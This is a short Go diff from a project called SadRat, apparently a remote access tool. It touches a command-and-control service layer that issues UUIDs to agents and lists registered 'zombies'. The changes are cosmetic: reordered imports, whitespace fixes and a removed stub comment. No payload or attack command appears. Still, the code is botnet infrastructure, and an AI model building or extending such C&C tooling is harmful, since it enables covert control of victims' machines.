@@ -1,8 +1,8 @@
 package service
 
 import (
-	"github.com/google/uuid"
 	"github.com/VitorDie/SadRat/internal/domain"
+	"github.com/google/uuid"
 )
 
 // ConcreteServer é a Camada de Serviço que guarda as regras de negócio do C&C
@@ -19,7 +19,7 @@ func NewConcreteServer(db domain.ServerDB) *ConcreteServer {
 func (s *ConcreteServer) GiveAnUUIDForAgentRequest() (string, error) {
 	// 1. Regra de Negócio: Gerar um UUID único
 	newUUID := uuid.NewString()
-	
+
 	// 2. Regra de Negócio: Transformar em Entidade do Domínio
 	agentRow := domain.NewAgentRow(newUUID)
 
@@ -31,11 +31,6 @@ func (s *ConcreteServer) GiveAnUUIDForAgentRequest() (string, error) {
 	// 4. Retorna a resposta limpa e agnóstica de rede
 	return newUUID, nil
 }
-
-// =========================================================================
-// STUBS: Métodos abaixo criados apenas para satisfazer a interface domain.Server.
-// Vamos implementá-los um a um nos próximos ciclos de TDD!
-// =========================================================================
 
 // SendAvailableAgents busca todos os zumbis registrados no banco e os retorna
 func (s *ConcreteServer) SendAvailableAgents() ([]domain.AgentRow, error) {
